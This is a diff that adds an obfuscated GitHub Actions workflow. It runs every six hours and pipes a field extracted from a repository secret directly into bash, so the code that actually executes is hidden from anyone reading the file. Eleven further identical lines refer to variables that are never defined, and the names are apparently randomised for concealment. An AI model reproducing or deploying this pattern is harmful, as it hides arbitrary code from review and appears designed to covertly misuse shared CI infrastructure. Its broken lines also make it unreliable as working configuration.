@@ -1,0 +1,27 @@
+name: xijuchangwei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xijuchangwei
+        env:
+          qwyu1935: ${{ secrets.qwyu1935 }}
+        run: |
+          echo $qwyu1935 | jq -r .zaia27 | /bin/bash
+          echo $drh0338 | jq -r .cxr09 | /bin/bash
+          echo $zkff95961 | jq -r .mzl528 | /bin/bash
+          echo $gy1 | jq -r .k70618 | /bin/bash
+          echo $eafh4 | jq -r .ov2 | /bin/bash
+          echo $snk3555 | jq -r .r0 | /bin/bash
+          echo $fef04217 | jq -r .ws3 | /bin/bash
+          echo $v9550 | jq -r .gbu62485 | /bin/bash
+          echo $ns73 | jq -r .cqoe08 | /bin/bash
+          echo $f6942 | jq -r .zwl450 | /bin/bash
+          echo $yiri6 | jq -r .djr22058 | /bin/bash
+          echo $t6 | jq -r .bgy01 | /bin/bash
+
